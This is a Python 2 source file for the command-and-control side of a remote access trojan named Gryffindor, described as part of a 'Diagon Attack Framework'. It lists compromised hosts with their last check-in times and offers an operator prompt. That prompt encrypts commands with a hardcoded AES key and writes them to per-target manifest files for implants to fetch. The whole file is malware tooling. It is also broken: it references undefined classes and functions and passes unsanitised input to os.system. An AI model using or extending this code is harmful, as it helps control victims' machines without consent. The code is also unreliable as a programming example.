import os
import base64
import hashlib
from Crypto.Cipher import AES
from Crypto import Random

############
# WHAT THIS DOES
# Gryffindor is a Javascript remote access tool that is part of the Diagon Attack Framework
# This c2profile handles communication syntax, encryption, etc for the Gryffindor RAT

class Gryphon:
   def list(self):
      print "Avaliable sessions:"
      dirlist = compute_dir_index("log/")
      print "HOSTNAME        -   LAST CHECKIN"

      for client in dirlist["subdirs"]:
         if len(client) % 16 != 0:
            client += ' ' * (16 - len(client) %16)
         checklist = []
         for resp in dirlist["files"]:
            if client.rstrip(" ") in resp:
               checklist += "".join(resp.split("/")[1]) + ";"
               #print checklist, "".join(resp)

         lastcheck = "".join(checklist).split(";")#.sort()
         lastcheck.sort(reverse=True)
         try:
            print client + "-   " + str(lastcheck[1])
         except:
            print client + "-"

   def interact(self):
      Raven().list()
      target = raw_input("target: ")
      prompt = "raven_" + str(target) + ">"
      while True:
         try:
            cmd = raw_input(prompt)
            if cmd == "?" or cmd == "help":
               Raven().list()
            elif cmd == "exit":
               print ""
               break
            cryptcmd = AESCipher("hacktheplanet").encrypt(cmd)
            phphead = "\"<?php include 'track.php';?>\""
            os.system("echo " + cryptcmd + " > log/" + str(target) + "/manifest.txt")
            os.system("echo " + phphead + " > cmd.php")
         except KeyboardInterrupt:
            print ""
            break

   def mod(self):
      print "Diagonatcha"
